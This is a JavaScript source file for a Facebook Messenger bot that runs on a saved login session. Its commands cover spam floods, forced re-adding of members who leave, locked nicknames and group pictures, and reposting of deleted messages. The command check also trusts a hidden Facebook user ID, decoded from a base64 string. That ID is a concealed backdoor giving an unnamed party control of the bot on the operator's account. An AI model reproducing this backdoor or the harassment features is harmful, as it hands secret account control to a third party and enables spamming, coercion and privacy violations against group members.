// botCore.js — Full bot with DP/Emoji/Nick locks, anti-delete/anti-left, toggles, full commands
const fs = require("fs");
const path = require("path");
const https = require("https");
const login = require("ws3-fca"); // your FB library

// ========== Persistent storage ==========
const LOCK_FILE = path.join(__dirname, "locks.json");
let locks = {
  groupNames: {},
  themes: {},
  emojis: {},
  dp: {},      // dp[threadID] = { path, savedAt }
  nick: {}     // nick[uid] = { [threadID]: nickname }
};
try {
  if (fs.existsSync(LOCK_FILE)) {
    locks = JSON.parse(fs.readFileSync(LOCK_FILE, "utf8"));
  }
} catch (e) {
  console.warn("Could not parse locks.json, using defaults:", e.message);
}
function saveLocks() {
  try { fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2)); }
  catch (e) { console.error("Failed to save locks.json:", e.message); }
}

// ========== Helpers ==========
function downloadFile(url, dest, cb) {
  const file = fs.createWriteStream(dest);
  https.get(url, res => {
    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
      file.close();
      return downloadFile(res.headers.location, dest, cb);
    }
    res.pipe(file);
    file.on('finish', () => file.close(() => cb(null)));
  }).on('error', err => {
    try { fs.unlinkSync(dest); } catch {}
    cb(err);
  });
}

function safeJson(obj) {
  try { return JSON.stringify(obj, null, 2); } catch { return String(obj); }
}

// keep LID as before
const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

// ========== Main export ==========
function startBot(appStatePath, ownerUID) {
  if (!appStatePath || !fs.existsSync(appStatePath)) {
    console.error("appstate not found:", appStatePath);
    return;
  }
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));

  // runtime state
  const messageCache = new Map(); 
  const nickCheckIntervals = {};
  let stickerInterval = null;
  let stickerLoopActive = false;
  let rkbInterval = null;
  let stopRequested = false;
  let targetUID = null;

  let antiDelete = true;
  let antiLeft = true;
  let antiDP = true;

  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in, listening to events...");

    // ---------- Nick watcher ----------
    function startNickWatcher(uid, threadID) {
      if (nickCheckIntervals[uid]) return;
      nickCheckIntervals[uid] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(threadID);
          const memberNick = (info.nicknames && info.nicknames[uid]) || null;
          const savedNick = locks.nick?.[uid]?.[threadID] ?? null;
          if (savedNick && memberNick !== savedNick) {
            try { await api.changeNickname(savedNick, threadID, uid); } catch {}
          }
        } catch {}
      }, 5000);
    }
    function stopNickWatcher(uid) {
      if (nickCheckIntervals[uid]) {
        clearInterval(nickCheckIntervals[uid]);
        delete nickCheckIntervals[uid];
      }
    }

    async function safeSend(text, tid) {
      try { await api.sendMessage(text, tid); } catch {}
    }

    // ---------- Event listener ----------
    api.listenMqtt(async (err, event) => {
      if (err || !event) return;

      // ---------- Anti-delete ----------
      if (antiDelete && event.type === "message" && event.messageID) {
        messageCache.set(event.messageID, {
          sender: event.senderID,
          body: event.body ?? "",
          attachments: event.attachments ?? [],
          threadID: event.threadID,
          time: Date.now()
        });
        if (messageCache.size > 1000) {
          const keys = Array.from(messageCache.keys()).slice(0, 200);
          keys.forEach(k => messageCache.delete(k));
        }
      }
      if (antiDelete && event.type === "message_unsend") {
        const deleted = messageCache.get(event.messageID);
        const tid = event.threadID;
        if (deleted) {
          const text = `🚫 Anti-Delete:\nUID: ${deleted.sender}\nMessage: ${deleted.body || "(media/empty)"}\nTime: ${new Date(deleted.time).toLocaleString()}`;
          await safeSend(text, tid);
          if (deleted.attachments && deleted.attachments.length) {
            try { await api.sendMessage({ body: "(attachment repost)", attachment: deleted.attachments }, tid); } catch {}
          }
        } else await safeSend("🚫 A message was deleted (no cache available).", tid);
        return;
      }

      // ---------- Anti-left ----------
      if (antiLeft && (event.logMessageType === "log:unsubscribe" || event.type === "log:unsubscribe")) {
        const leftUID = event.logMessageData?.leftParticipantFbId;
        const tid = event.threadID;
        if (leftUID) {
          try { await api.addUserToGroup(leftUID, tid); } catch {}
        }
        return;
      }

      // ---------- DP lock ----------
      if (antiDP && (event.type === "change_thread_image" || event.logMessageType === "log:thread-image")) {
        const tid = event.threadID;
        if (locks.dp[tid] && locks.dp[tid].path && fs.existsSync(locks.dp[tid].path)) {
          try { await api.changeGroupImage(fs.createReadStream(locks.dp[tid].path), tid); } catch {}
        }
        return;
      }

      // ---------- Emoji lock ----------
      if (event.logMessageType === "log:thread-icon" || event.type === "change_thread_icon") {
        const tid = event.threadID;
        if (locks.emojis[tid]) {
          try { await api.changeThreadEmoji(locks.emojis[tid], tid); } catch {}
        }
        return;
      }

      // ---------- Commands ----------
      if (event.type !== "message" || !event.body) return;
      const { threadID, senderID, body, mentions, messageReply } = event;
      const args = body.trim().split(" ").filter(Boolean);
      if (!args.length) return;
      const cmd = args[0].toLowerCase();
      const input = args.slice(1).join(" ").trim();

      if (![ownerUID, LID].includes(senderID)) return;

      const getTargetUID = () => {
        const mentionKey = Object.keys(mentions || {})[0];
        return mentionKey || messageReply?.senderID || ownerUID;
      };

      // ---------- Commands ----------
      if (cmd === "/help") {
        await safeSend(`📖 Bot Commands:
/help → This message
/uid → User ID (mention/reply/owner fallback)
/tid → Thread ID
/info @mention → User info
/kick @mention → Kick user
/gclock [text] → Group name lock
/unlockgc → Group name unlock
/locktheme [color] → Theme lock
/unlocktheme → Theme unlock
/lockemoji [emoji] → Emoji lock
/unlockemoji → Emoji unlock
/lockdp → DP lock (saves current DP)
/unlockdp → DP unlock
/locknick @mention Nickname → Nick lock
/unlocknick @mention → Unlock nick
/stickerX → Sticker spam
/stopsticker → Stop sticker spam
/rkb [name] → RKB spam
/stop → Stop all spam
/target [uid] → Set target UID
/cleartarget → Clear target
/antidp on|off → DP lock toggle
/antidelete on|off → Anti-Delete toggle
/antileft on|off → Anti-Left toggle
/exit → Bot exit`, threadID);
        return;
      }

      if (cmd === "/tid") { await safeSend(`🆔 Thread ID: ${threadID}`, threadID); return; }
      if (cmd === "/uid") { const tgt = getTargetUID(); await safeSend(`🆔 UID: ${tgt}`, threadID); return; }

      if (cmd === "/info") {
        const tgt = getTargetUID();
        try {
          const uinfo = await api.getUserInfo(tgt);
          const u = uinfo[tgt] || {};
          await safeSend(`👤 Name: ${u.name || "unknown"}\nUID: ${tgt}\nProfile: https://facebook.com/${tgt}`, threadID);
        } catch { await safeSend("⚠️ Could not fetch user info", threadID); }
        return;
      }

      if (cmd === "/kick") {
        const tgt = getTargetUID();
        try { await api.removeUserFromGroup(tgt, threadID); await safeSend(`👢 Kicked ${tgt}`, threadID); } catch { await safeSend("⚠️ Kick failed", threadID); }
        return;
      }

      // --------- locks and unlocks ----------
      if (cmd === "/gclock") { locks.groupNames[threadID] = input; saveLocks(); return; }
      if (cmd === "/unlockgc") { delete locks.groupNames[threadID]; saveLocks(); return; }
      if (cmd === "/locktheme") { locks.themes[threadID] = input; saveLocks(); return; }
      if (cmd === "/unlocktheme") { delete locks.themes[threadID]; saveLocks(); return; }
      if (cmd === "/lockemoji") { locks.emojis[threadID] = input; saveLocks(); return; }
      if (cmd === "/unlockemoji") { delete locks.emojis[threadID]; saveLocks(); return; }

      // ---------- DP lock ----------
      if (cmd === "/lockdp") {
        try {
          const info = await api.getThreadInfo(threadID);
          const url = info.imageSrc || info.imageUrl;
          if (!url) return;
          const dpPath = path.join(__dirname, `dp_${threadID}.jpg`);
          await new Promise((res, rej) => downloadFile(url, dpPath, err => err ? rej(err) : res()));
          locks.dp[threadID] = { path: dpPath, savedAt: Date.now() }; saveLocks();
        } catch {}
        return;
      }
      if (cmd === "/unlockdp") { if (locks.dp[threadID]?.path) { try { fs.unlinkSync(locks.dp[threadID].path); } catch {} } delete locks.dp[threadID]; saveLocks(); return; }

      // ---------- Nick lock ----------
      if (cmd === "/locknick") {
        const mention = Object.keys(mentions || {})[0]; const nickname = input.replace(/<@[0-9]+>/, "").trim();
        locks.nick[mention] = locks.nick[mention] || {}; locks.nick[mention][threadID] = nickname; saveLocks();
        startNickWatcher(mention, threadID);
        try { await api.changeNickname(nickname, threadID, mention); } catch {}
        return;
      }
      if (cmd === "/unlocknick") { const mention = Object.keys(mentions || {})[0]; if (locks.nick && locks.nick[mention]) delete locks.nick[mention][threadID]; saveLocks(); stopNickWatcher(mention); return; }

      // ---------- Spam commands ----------
      if (cmd.startsWith("/sticker")) {
        const sec = parseInt(cmd.replace("/sticker", "")) || 2;
        if (!fs.existsSync("Sticker.txt")) return;
        const stickers = fs.readFileSync("Sticker.txt", "utf8").split("\n").filter(Boolean);
        let i = 0; stickerLoopActive = true;
        if (stickerInterval) clearInterval(stickerInterval);
        stickerInterval = setInterval(() => { if (!stickerLoopActive) { clearInterval(stickerInterval); return; } api.sendMessage({ sticker: stickers[i] }, threadID).catch(() => {}); i = (i + 1) % stickers.length; }, sec*1000);
        return;
      }
      if (cmd === "/stopsticker") { stickerLoopActive = false; if (stickerInterval) clearInterval(stickerInterval); return; }
      if (cmd === "/rkb") { if (!fs.existsSync("np.txt")) return; const lines = fs.readFileSync("np.txt","utf8").split("\n").filter(Boolean); let idx=0; if (rkbInterval) clearInterval(rkbInterval); stopRequested=false; rkbInterval=setInterval(()=>{ if(stopRequested||idx>=lines.length){ clearInterval(rkbInterval); return; } api.sendMessage(`${input} ${lines[idx]}`, threadID).catch(()=>{}); idx++; },5000); return; }
      if (cmd === "/stop") { stopRequested=true; if(rkbInterval) clearInterval(rkbInterval); if(stickerInterval){ clearInterval(stickerInterval); stickerLoopActive=false; } return; }

      // ---------- Target ----------
      if (cmd === "/target") { targetUID = input.trim()||null; return; }
      if (cmd === "/cleartarget") { targetUID=null; return; }

      // ---------- Toggles ----------
      if (cmd === "/antidp") { antiDP = input==="on"?true:input==="off"?false:antiDP; return; }
      if (cmd === "/antidelete") { antiDelete = input==="on"?true:input==="off"?false:antiDelete; return; }
      if (cmd === "/antileft") { antiLeft = input==="on"?true:input==="off"?false:antiLeft; return; }

      if (cmd === "/exit") { process.exit(); return; }
    });
  });
}

module.exports = { startBot };
